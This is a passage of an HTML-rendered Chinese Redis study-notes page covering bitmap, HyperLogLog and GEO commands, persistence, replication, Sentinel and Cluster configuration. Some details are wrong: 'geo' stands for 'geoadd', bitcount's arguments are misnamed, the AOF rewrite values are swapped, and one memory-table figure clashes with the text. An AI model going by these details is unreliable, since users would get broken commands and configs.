+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><h4 id="消息队列"><a href="#消息队列" class="header-anchor">#</a> 消息队列</h4> <h3 id="bitmap"><a href="#bitmap" class="header-anchor">#</a> bitmap</h3> <h4 id="位图"><a href="#位图" class="header-anchor">#</a> 位图</h4> <h4 id="命令-3"><a href="#命令-3" class="header-anchor">#</a> 命令</h4> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token comment">#给位图指定索引设置值</span>
+setbit key offset value
+<span class="token comment">#获取位图指定索引的值</span>
+getbit key offset
+<span class="token comment">#获取位图指定范围(start到end，单位为字节，如果不指定就是获取全部)位值为1的个数</span>
+bitcount key <span class="token punctuation">[</span>key end<span class="token punctuation">]</span>
+<span class="token comment">#做多个Bitmap的and(交集)、or(并集)、not(非)、xor(异或)操作并将结果保存在destkey中</span>
+bitop <span class="token function">op</span> destkey key <span class="token punctuation">[</span>key<span class="token punctuation">..</span>.<span class="token punctuation">]</span>
+<span class="token comment">#计算位图指定范围(start到end，单位为字节，如果不指定就是获取全部)第一个偏移量对应的值等于targetBit的位置</span>
+bitpos key targetBit <span class="token punctuation">[</span>start<span class="token punctuation">]</span> <span class="token punctuation">[</span>end<span class="token punctuation">]</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><h4 id="独立用户统计"><a href="#独立用户统计" class="header-anchor">#</a> 独立用户统计</h4> <ol><li>使用 set 和 Bitmap</li> <li>1 亿用户，5 千万独立</li></ol> <table><thead><tr><th style="text-align:center;">数据类型</th> <th style="text-align:center;">每个 userid 占用空间</th> <th style="text-align:center;">需要存储的用户量</th> <th style="text-align:center;">全部内存量</th></tr></thead> <tbody><tr><td style="text-align:center;">set</td> <td style="text-align:center;">32 位(假设 userid 用的是整型，实际很多网站用的是长整型)</td> <td style="text-align:center;">1000000</td> <td style="text-align:center;">32 位 * 1000000 = 4MB</td></tr> <tr><td style="text-align:center;">Bitmap</td> <td style="text-align:center;">1 位</td> <td style="text-align:center;">100000000</td> <td style="text-align:center;">1 位 * 100000000 = 12.5MB</td></tr></tbody></table> <div class="custom-block warning"><p class="custom-block-title">WARNING</p> <p>type=string，最大 512MB</p> <p>注意 setbit 时的偏移量，可能有较大耗时</p> <p>位图不是绝对好</p></div> <h3 id="hyperloglog"><a href="#hyperloglog" class="header-anchor">#</a> hyperloglog</h3> <p>基于 HyperLogLog 算法：极小空间完成独立数量统计。本质还是字符串。</p> <h4 id="命令-4"><a href="#命令-4" class="header-anchor">#</a> 命令</h4> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token comment">#向hyperloglog添加元素</span>
+pfadd key element <span class="token punctuation">[</span>element <span class="token punctuation">..</span>.<span class="token punctuation">]</span>
+<span class="token comment">#计算hyperloglog的独立总数</span>
+pfcount key <span class="token punctuation">[</span>key <span class="token punctuation">..</span>.<span class="token punctuation">]</span>
+<span class="token comment">#合并多个hyperloglog</span>
+pfmerge destkey sourcekey <span class="token punctuation">[</span>sourcekey <span class="token punctuation">..</span>.<span class="token punctuation">]</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><h3 id="geo"><a href="#geo" class="header-anchor">#</a> geo</h3> <p>GEO(地理信息定位)：存储经纬度，计算两地距离，范围计算等</p> <h4 id="命令-5"><a href="#命令-5" class="header-anchor">#</a> 命令</h4> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token comment">#增加地理位置信息</span>
+geo key longitude latitude member <span class="token punctuation">[</span>longitude latitude member <span class="token punctuation">..</span>.<span class="token punctuation">]</span>
+<span class="token comment">#获取地理位置信息</span>
+geopos key member <span class="token punctuation">[</span>member <span class="token punctuation">..</span>.<span class="token punctuation">]</span>
+<span class="token comment">#获取两个地理位置的距离</span>
+<span class="token comment">#unit: m(米) km(千米) mi(英里) ft(尺)</span>
+geodist key member1 member2 <span class="token punctuation">[</span>unit<span class="token punctuation">]</span>
+<span class="token comment">#获取指定位置范围内的地理位置信息集合</span>
+<span class="token comment">#withcoord：返回结果中包含经纬度</span>
+<span class="token comment">#withdist：返回结果中包含距离中心节点位置</span>
+<span class="token comment">#withhash：返回结果中包含geohash</span>
+<span class="token comment">#COUNT count：指定返回结果的数量</span>
+<span class="token comment">#asc|desc：返回结果按照距离中心节点的距离做升序或者降序</span>
+<span class="token comment">#store key：将返回结果的地理位置信息保存到指定键</span>
+<span class="token comment">#storedist key：将返回结果距离中心节点的距离保存到指定键</span>
+georadius key longitude latitude radiusm<span class="token operator">|</span>km<span class="token operator">|</span>ft<span class="token operator">|</span>mi <span class="token punctuation">[</span>withcoord<span class="token punctuation">]</span> <span class="token punctuation">[</span>withdist<span class="token punctuation">]</span> <span class="token punctuation">[</span>withhash<span class="token punctuation">]</span> <span class="token punctuation">[</span>COUNT count<span class="token punctuation">]</span> <span class="token punctuation">[</span>asc<span class="token operator">|</span>desc<span class="token punctuation">]</span> <span class="token punctuation">[</span>store key<span class="token punctuation">]</span><span class="token punctuation">[</span>storedist key<span class="token punctuation">]</span>
+
+georadiusbymember key member radiusm<span class="token operator">|</span>km<span class="token operator">|</span>ft<span class="token operator">|</span>mi <span class="token punctuation">[</span>withcoord<span class="token punctuation">]</span> <span class="token punctuation">[</span>withdist<span class="token punctuation">]</span> <span class="token punctuation">[</span>withhash<span class="token punctuation">]</span> <span class="token punctuation">[</span>COUNT count<span class="token punctuation">]</span> <span class="token punctuation">[</span>asc<span class="token operator">|</span>desc<span class="token punctuation">]</span> <span class="token punctuation">[</span>store key<span class="token punctuation">]</span><span class="token punctuation">[</span>storedist key<span class="token punctuation">]</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><h2 id="持久化"><a href="#持久化" class="header-anchor">#</a> 持久化</h2> <p>redis 所有数据保存在内存中，对数据的更新将异步地保存在磁盘上</p> <h3 id="rdb"><a href="#rdb" class="header-anchor">#</a> RDB</h3> <h4 id="触发机制"><a href="#触发机制" class="header-anchor">#</a> 触发机制</h4> <ul><li>save(同步)</li> <li>bgsave(异步)</li> <li>自动</li></ul> <h4 id="配置-2"><a href="#配置-2" class="header-anchor">#</a> 配置</h4> <div class="language- line-numbers-mode"><pre class="language-text"><code>save 900 1
+save 300 10
+save 60 10000
+dbfilename dump-${port}.rdb
+dir /bigdiskpath
+stop-writes-on-bgsave-err yes
+rdbcompression yes
+rdbchecksum yes
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h4 id="触发机制-不可忽略方式"><a href="#触发机制-不可忽略方式" class="header-anchor">#</a> 触发机制-不可忽略方式</h4> <ol><li>全量复制</li> <li>debug reload</li> <li>shutdown</li></ol> <h4 id="总结"><a href="#总结" class="header-anchor">#</a> 总结</h4> <ol><li>RDB 是 Redis 内存到硬盘的快照，用于持久化</li> <li>save 通常会阻塞 Redis</li> <li>bgsave 不会阻塞 Redis，但是会 fork 新进程</li> <li>save 自动配置满足任一就会被执行</li> <li>有些触发机制不容忽视</li></ol> <h3 id="aof"><a href="#aof" class="header-anchor">#</a> AOF</h3> <h4 id="策略"><a href="#策略" class="header-anchor">#</a> 策略</h4> <ul><li>always</li> <li>everysec</li> <li>no</li></ul> <h4 id="aof-重写作用"><a href="#aof-重写作用" class="header-anchor">#</a> AOF 重写作用</h4> <ul><li>减少硬盘占有量</li> <li>加速恢复速度</li></ul> <h4 id="aof-重写两种方式"><a href="#aof-重写两种方式" class="header-anchor">#</a> AOF 重写两种方式</h4> <ul><li>bgrewriteaof</li> <li>AOF 重写配置</li></ul> <h4 id="aof-重写配置"><a href="#aof-重写配置" class="header-anchor">#</a> AOF 重写配置</h4> <ul><li>配置</li></ul> <div class="language- line-numbers-mode"><pre class="language-text"><code>#AOD重写需要的尺寸
+auto-aof-rewrite-min-size
+#AOF文件增长率
+auto-aof-rewrite-percentage
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><ul><li>统计</li></ul> <div class="language- line-numbers-mode"><pre class="language-text"><code>#AOF当前尺寸(单位：字节)
+aof_current_size
+#AOF上次启动和重写的尺寸(单位：字节)
+aof_base_size
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><h4 id="自动触发时机"><a href="#自动触发时机" class="header-anchor">#</a> 自动触发时机</h4> <ul><li>aof_current_size &gt; auto-aof-rewrite-min-size</li> <li>aof_current_size - aof_base_size / aof_base_size &gt; auto-aof-rewrite-percentage</li></ul> <h4 id="配置-3"><a href="#配置-3" class="header-anchor">#</a> 配置</h4> <div class="language- line-numbers-mode"><pre class="language-text"><code>appendonly yes
+appendfilename &quot;appendonly-${port}.aof&quot;
+appendfsync everysec
+dir /bigdiskpath
+no-appendfsync-on-rewrite yes
+auto-aof-rewrite-min-size 100
+auto-aof-rewrite-percentage 64mb
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><h3 id="rdb-和-aof-选择"><a href="#rdb-和-aof-选择" class="header-anchor">#</a> RDB 和 AOF 选择</h3> <h4 id="rdb-最佳策略"><a href="#rdb-最佳策略" class="header-anchor">#</a> RDB 最佳策略</h4> <ul><li>&quot;关&quot;</li> <li>集中管理</li> <li>主从，从开</li></ul> <h4 id="aof-最佳策略"><a href="#aof-最佳策略" class="header-anchor">#</a> AOF 最佳策略</h4> <ul><li>&quot;开&quot;：缓存和存储</li> <li>AOF 重写集中管理</li> <li>everysec</li></ul> <h4 id="最佳策略"><a href="#最佳策略" class="header-anchor">#</a> 最佳策略</h4> <ul><li>小分片</li> <li>缓存或者存储</li> <li>监控(硬盘、内存、负载、网络)</li> <li>足够内存</li></ul> <h3 id="常见问题"><a href="#常见问题" class="header-anchor">#</a> 常见问题</h3> <h4 id="fork-操作"><a href="#fork-操作" class="header-anchor">#</a> fork 操作</h4> <ol><li>同步操作</li> <li>与内存量息息相关：内存越大，耗时越长(与机器类型有关)</li> <li>info:latest_fork_usec</li></ol> <h4 id="改善-fork"><a href="#改善-fork" class="header-anchor">#</a> 改善 fork</h4> <ol><li>优先使用物理机或者高效支持 fork 操作的虚拟化技术</li> <li>控制 Redis 实例最大可用内存：maxmemory</li> <li>合理配置 Linux 内存分配策略：vm.overcommit_memory=1</li> <li>降低 fork 频率：例如放宽 AOF 重写自动触发时机，不必要的全量复制</li></ol> <h4 id="子进程开销和优化"><a href="#子进程开销和优化" class="header-anchor">#</a> 子进程开销和优化</h4> <ol><li>CPU</li></ol> <ul><li>开销：RDB 和 AOF 文件生成，属于 CPU 密集型</li> <li>优化：不做 CPU 绑定，不和 CPU 密集型部署</li></ul> <ol start="2"><li>内存</li></ol> <ul><li>开销：fork 内存开销，copy-on-write</li> <li>优化：echo never &gt; /sys/kernel/mm/transparent_hugepage/enabled</li></ul> <ol start="3"><li>硬盘</li></ol> <ul><li>开销：AOF 和 RDB 文件写入，可以结合 iostat,iotop 分析</li> <li>优化：
+<ul><li>不要和高硬盘负载服务部署一起：存储服务、消息队列等</li> <li>no-appendfsync-on-rewrite = yes</li> <li>根据写入量决定磁盘类型：例如 ssd</li> <li>单机多实例持久化文件目录可以考虑分盘</li></ul></li></ul> <h4 id="aof-阻塞定位"><a href="#aof-阻塞定位" class="header-anchor">#</a> AOF 阻塞定位</h4> <ul><li>Redis 日志：Asynchronous AOF fsync is taking too long (disk is busy?). Writing the AOF buffer without waiting for fsync to complete, this may slow down Redis.</li> <li><code>info persistence</code></li> <li><code>top</code></li></ul> <h2 id="主从复制"><a href="#主从复制" class="header-anchor">#</a> 主从复制</h2> <ol><li>一个 master 可以有多个 slave</li> <li>一个 slave 只能有一个 master</li> <li>数据流向是单向的，master 到 slave</li></ol> <h3 id="主从复制配置"><a href="#主从复制配置" class="header-anchor">#</a> 主从复制配置</h3> <ul><li>slaveof 命令</li></ul> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>slaveof <span class="token number">127.0</span>.0.1 <span class="token number">6379</span>
+<span class="token comment">#取消复制</span>
+slaveof no one
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><ul><li>修改配置</li></ul> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>slaveof <span class="token function">ip</span> port
+slave-read-only <span class="token function">yes</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h3 id="全量复制开销"><a href="#全量复制开销" class="header-anchor">#</a> 全量复制开销</h3> <ol><li>bgsave 时间</li> <li>RDB 文件网络传输时间</li> <li>从节点清空数据时间</li> <li>从节点加载 RDB 的时间</li> <li>可能的 AOF 重写时间</li></ol> <h3 id="常见问题-2"><a href="#常见问题-2" class="header-anchor">#</a> 常见问题</h3> <h4 id="读写分离"><a href="#读写分离" class="header-anchor">#</a> 读写分离</h4> <p>读流量分摊到从节点</p> <ul><li>复制数据延迟</li> <li>读到过期数据</li> <li>从节点故障</li></ul> <h4 id="配置不一致"><a href="#配置不一致" class="header-anchor">#</a> 配置不一致</h4> <ul><li>例如 maxmemory 不一致：丢失数据</li> <li>例如数据结构优化参数(例如 hash-max-ziplist-entries)：内存不一致</li></ul> <h4 id="规避全量复制"><a href="#规避全量复制" class="header-anchor">#</a> 规避全量复制</h4> <ol><li>第一次全量复制</li></ol> <ul><li>第一次不可避免</li> <li>小主节点、低峰</li></ul> <ol start="2"><li>节点运行 ID 不匹配</li></ol> <ul><li>主节点重启(运行 ID 变化)</li> <li>故障转移，例如哨兵或集群</li></ul> <ol start="3"><li>复制积压缓冲区不足</li></ol> <ul><li>网络中断，部分复制无法满足</li> <li>增大复制缓冲区配置 rel_backlog_size，网络&quot;增强&quot;</li></ul> <h4 id="规避复制风暴"><a href="#规避复制风暴" class="header-anchor">#</a> 规避复制风暴</h4> <ol><li>单节点复制风暴</li></ol> <ul><li>问题：主节点重启，多从节点复制</li> <li>解决：更换复制拓扑</li></ul> <ol><li>单机器复制风暴</li></ol> <ul><li>机器宕机后，大量全量复制</li> <li>主节点分数多机器</li></ul> <h2 id="redis-sentinel"><a href="#redis-sentinel" class="header-anchor">#</a> Redis Sentinel</h2> <h3 id="redis-sentinel-故障转移"><a href="#redis-sentinel-故障转移" class="header-anchor">#</a> Redis Sentinel 故障转移</h3> <ol><li>多个 sentinel 发现并确认 master 有问题</li> <li>选举出一个 sentinel 作为领导</li> <li>选出一个 slave 作为 master</li> <li>通知其余 slave 成为新的 master 的 slave</li> <li>通知客户端主从变化</li></ol> <h3 id="安装与配置"><a href="#安装与配置" class="header-anchor">#</a> 安装与配置</h3> <ol><li>配置开启主从节点</li> <li>配置开启 sentinel 监控主节点(sentinel 是特殊的 redis)</li> <li>实际应该多机器</li> <li>详细配置节点</li></ol> <h4 id="master"><a href="#master" class="header-anchor">#</a> Master</h4> <ul><li>启动</li></ul> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>redis-server redis-7000.conf
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><ul><li>配置</li></ul> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>port <span class="token number">7000</span>
+daemonize <span class="token function">yes</span>
+pidfile /var/run/redis-7000.pid
+logfile <span class="token string">&quot;7000.log&quot;</span>
+<span class="token function">dir</span> <span class="token string">&quot;/usr/local/redis/data/&quot;</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><h4 id="slave"><a href="#slave" class="header-anchor">#</a> Slave</h4> <ul><li>启动</li></ul> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>redis-server redis-7001.conf
+redis-server redis-7002.conf
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><ul><li>配置</li></ul> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token comment">#slave-1</span>
+port <span class="token number">7001</span>
+daemonize <span class="token function">yes</span>
+pidfile /var/run/redis-7001.pid
+logfile <span class="token string">&quot;7001.log&quot;</span>
+<span class="token function">dir</span> <span class="token string">&quot;/usr/local/redis/data/&quot;</span>
+slaveof <span class="token number">127.0</span>.0.1 <span class="token number">7000</span>
+<span class="token comment">#slave-2</span>
+port <span class="token number">7002</span>
+daemonize <span class="token function">yes</span>
+pidfile /var/run/redis-7002.pid
+logfile <span class="token string">&quot;7002.log&quot;</span>
+<span class="token function">dir</span> <span class="token string">&quot;/usr/local/redis/data/&quot;</span>
+slaveof <span class="token number">127.0</span>.0.1 <span class="token number">7000</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><h4 id="sentinel-主要配置"><a href="#sentinel-主要配置" class="header-anchor">#</a> sentinel 主要配置</h4> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token function">vim</span> redis-sentinel-26379.conf
+
+port <span class="token number">26379</span>
+daemonize <span class="token function">yes</span>
+<span class="token function">dir</span> <span class="token string">&quot;/usr/local/redis/data/&quot;</span>
+logfile <span class="token string">&quot;26379.log&quot;</span>
+sentinel monitor mymaster <span class="token number">127.0</span>.0.1 <span class="token number">7000</span> <span class="token number">2</span>
+sentinel down-after-milliseconds mymaster <span class="token number">30000</span>
+sentinel parallel-syncs mymaster <span class="token number">1</span>
+sentinel failover-timeout mymaster <span class="token number">180000</span>
+
+
+<span class="token function">vim</span> redis-sentinel-26380.conf
+
+port <span class="token number">26380</span>
+daemonize <span class="token function">yes</span>
+<span class="token function">dir</span> <span class="token string">&quot;/usr/local/redis/data/&quot;</span>
+logfile <span class="token string">&quot;26380.log&quot;</span>
+sentinel monitor mymaster <span class="token number">127.0</span>.0.1 <span class="token number">7000</span> <span class="token number">2</span>
+sentinel down-after-milliseconds mymaster <span class="token number">30000</span>
+sentinel parallel-syncs mymaster <span class="token number">1</span>
+sentinel failover-timeout mymaster <span class="token number">180000</span>
+
+
+<span class="token function">vim</span> redis-sentinel-26381.conf
+
+port <span class="token number">26381</span>
+daemonize <span class="token function">yes</span>
+<span class="token function">dir</span> <span class="token string">&quot;/usr/local/redis/data/&quot;</span>
+logfile <span class="token string">&quot;26381.log&quot;</span>
+sentinel monitor mymaster <span class="token number">127.0</span>.0.1 <span class="token number">7000</span> <span class="token number">2</span>
+sentinel down-after-milliseconds mymaster <span class="token number">30000</span>
+sentinel parallel-syncs mymaster <span class="token number">1</span>
+sentinel failover-timeout mymaster <span class="token number">180000</span>
+<span class="token comment">#启动</span>
+redis-sentinel redis-sentinel-26379.conf
+redis-sentinel redis-sentinel-26380.conf
+redis-sentinel redis-sentinel-26381.conf
+
+port <span class="token variable">${port}</span>
+daemonize <span class="token function">yes</span>
+<span class="token function">dir</span> <span class="token string">&quot;/usr/local/redis/data/&quot;</span>
+logfile <span class="token string">&quot;<span class="token variable">${port}</span>.log&quot;</span>
+sentinel monitor mymaster <span class="token number">127.0</span>.0.1 <span class="token number">7000</span> <span class="token number">2</span>
+sentinel down-after-milliseconds mymaster <span class="token number">30000</span>
+sentinel parallel-syncs mymaster <span class="token number">1</span>
+sentinel failover-timeout mymaster <span class="token number">180000</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br></div></div><h3 id="故障转移"><a href="#故障转移" class="header-anchor">#</a> 故障转移</h3> <ul><li>从 slave 节点中选出一个&quot;合适的&quot;节点作为新的 master</li> <li>对上面的 slave 节点执行<code>slaveof no one</code>命令让其成为 master 节点</li> <li>向剩余的 slave 节点发送命令，让他们成为新 master 节点的 slave 节点，复制规则和 parallel-syncs 参数有关</li> <li>更新对原来 master 节点配置为 slave，并保持着对其&quot;关注&quot;，当其恢复后命令他去复制新的 master 节点</li></ul> <h4 id="选择-合适的-节点"><a href="#选择-合适的-节点" class="header-anchor">#</a> 选择&quot;合适的&quot;节点</h4> <ul><li>选择<code>slave-priority</code>(slave 节点优先级)最高的 slave 节点，如果存在则返回，不存在则继续</li> <li>选择复制偏移量最大的 slave 节点(复制的最完整)，如果存在则返回，不存在则继续</li> <li>选择 runID 最小的 slave 节点</li></ul> <h3 id="常见问题-3"><a href="#常见问题-3" class="header-anchor">#</a> 常见问题</h3> <h4 id="节点运维"><a href="#节点运维" class="header-anchor">#</a> 节点运维</h4> <ul><li>机器下线：例如过保等情况</li> <li>机器性能不足：例如 CPU、内存、硬盘、网络等</li> <li>节点自身故障：例如服务不稳定等</li></ul> <p>主节点： <code>sentinel failover &lt;masterName&gt;&lt;/masterName&gt;</code></p> <p>从节点：临时下线还是永久下线，例如是否做一些清理工作。但是要考虑读写分离的情况</p> <p>Sentinel 节点：同上</p> <h4 id="节点上线"><a href="#节点上线" class="header-anchor">#</a> 节点上线</h4> <p>主节点： <code>sentinel failover</code>进行替换</p> <p>从节点：<code>slaveof</code>即可，sentinel 节点可以感知</p> <p>Sentinel 节点：参考其他 sentinel 节点启动即可</p> <h4 id="高可用读写分离"><a href="#高可用读写分离" class="header-anchor">#</a> 高可用读写分离</h4> <h4 id="从节点对作用"><a href="#从节点对作用" class="header-anchor">#</a> 从节点对作用</h4> <ul><li>副本：高可用的基础</li> <li>扩展：读能力</li></ul> <h4 id="三个-消息"><a href="#三个-消息" class="header-anchor">#</a> 三个&quot;消息&quot;</h4> <ul><li>+switch-master：切换主节点(从节点晋升主节点)</li> <li>+conver-to-slave：切换从节点(原主节点降为从节点)</li> <li>sdown：主观下线</li></ul> <h2 id="redis-cluster"><a href="#redis-cluster" class="header-anchor">#</a> Redis Cluster</h2> <h3 id="集群"><a href="#集群" class="header-anchor">#</a> 集群</h3> <ol><li>并发量</li> <li>数据量</li></ol> <h3 id="数据分布"><a href="#数据分布" class="header-anchor">#</a> 数据分布</h3> <table><thead><tr><th style="text-align:center;">分布方式</th> <th style="text-align:center;">特点</th> <th style="text-align:center;">典型产品</th></tr></thead> <tbody><tr><td style="text-align:center;">哈希分布</td> <td style="text-align:center;">数据分散度高 <br>键值分布业务无关 <br>无法顺序访问 <br>支持批量操作</td> <td style="text-align:center;">一致性哈希 <br>Memcache <br>Redis Cluster <br>其他缓存产品</td></tr> <tr><td style="text-align:center;">顺序分布</td> <td style="text-align:center;">数据分散度倾斜 <br>键值业务相关 <br>可顺序访问 <br>支持批量操作</td> <td style="text-align:center;">BigTable <br>HBase</td></tr></tbody></table> <h4 id="顺序分布"><a href="#顺序分布" class="header-anchor">#</a> 顺序分布</h4> <h4 id="哈希分布-例如节点取模"><a href="#哈希分布-例如节点取模" class="header-anchor">#</a> 哈希分布(例如节点取模)</h4> <ul><li>节点取余分区
+<ul><li>节点取余：hash(key)%nodes
+<ul><li>客户端分片：哈希 + 取余</li> <li>节点伸缩：数据节点关系变化，导致数据迁移</li> <li>迁移数量和添加节点数量有关：建议翻倍扩容</li></ul></li></ul></li> <li>一致性哈希分区
+<ul><li>客户端分片：哈希 + 顺时针(优化取余)</li> <li>节点伸缩：只影响邻近节点，但是还是有数据迁移</li> <li>翻倍伸缩：保证最小迁移数据和负载均衡</li></ul></li> <li>虚拟槽分区 CRC16(key) &amp; 16383
+<ul><li>预设虚拟槽：每个槽映射一个数据子集，一般比节点大</li> <li>良好的哈希函数：例如 CRC16</li> <li>服务端管理节点、槽、数据：例如 Redis Cluster</li></ul></li></ul> <h3 id="安装"><a href="#安装" class="header-anchor">#</a> 安装</h3> <h4 id="原生命令安装"><a href="#原生命令安装" class="header-anchor">#</a> 原生命令安装</h4> <p>Cluster 节点主要配置</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>cluster-enabled <span class="token function">yes</span>
+cluster-node-timeout <span class="token number">15000</span>
+cluster-config-file nodes.conf
+cluster-require-full-coverage <span class="token function">yes</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>Cluster 常用命令</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>redis-cli -c -p <span class="token number">7000</span>
+cluster info
+cluster nodes
+cluster slots
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><ol><li>配置开启节点</li></ol> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token comment">#配置开启Redis</span>
+port <span class="token variable">${port}</span>
+daemonize <span class="token function">yes</span>
+<span class="token function">dir</span> <span class="token string">&quot;/usr/local/redis/data/&quot;</span>
+dbfilename <span class="token string">&quot;dump-<span class="token variable">${port}</span>.rdb&quot;</span>
+logfile <span class="token string">&quot;<span class="token variable">${port}</span>.log&quot;</span>
+cluster-enabled <span class="token function">yes</span>
+cluster-config-file nodes-<span class="token variable">${port}</span>.conf
+cluster-require-full-coverage no
+
+<span class="token function">mkdir</span> /usr/local/redis/config
+<span class="token function">mkdir</span> /usr/local/redis/data
+<span class="token builtin class-name">cd</span> /usr/local/redis/config
+<span class="token function">cat</span> redis-7000.conf
+
+port <span class="token number">7000</span>
+daemonize <span class="token function">yes</span>
+<span class="token function">dir</span> <span class="token string">&quot;/usr/local/redis/data/&quot;</span>
+dbfilename <span class="token string">&quot;dump-7000.rdb&quot;</span>
+logfile <span class="token string">&quot;7000.log&quot;</span>
+cluster-enabled <span class="token function">yes</span>
+cluster-config-file nodes-7000.conf
+cluster-require-full-coverage no
+
+<span class="token function">sed</span> <span class="token string">'s/7000/7001/g'</span> redis-7000.conf <span class="token operator">&gt;</span> redis-7001.conf
+<span class="token function">sed</span> <span class="token string">'s/7000/7002/g'</span> redis-7000.conf <span class="token operator">&gt;</span> redis-7002.conf
+<span class="token function">sed</span> <span class="token string">'s/7000/7003/g'</span> redis-7000.conf <span class="token operator">&gt;</span> redis-7003.conf
+<span class="token function">sed</span> <span class="token string">'s/7000/7004/g'</span> redis-7000.conf <span class="token operator">&gt;</span> redis-7004.conf
+<span class="token function">sed</span> <span class="token string">'s/7000/7005/g'</span> redis-7000.conf <span class="token operator">&gt;</span> redis-7005.conf
+
+redis-server redis-7000.conf
+redis-server redis-7001.conf
+redis-server redis-7002.conf
+redis-server redis-7003.conf
+redis-server redis-7004.conf
+redis-server redis-7005.conf
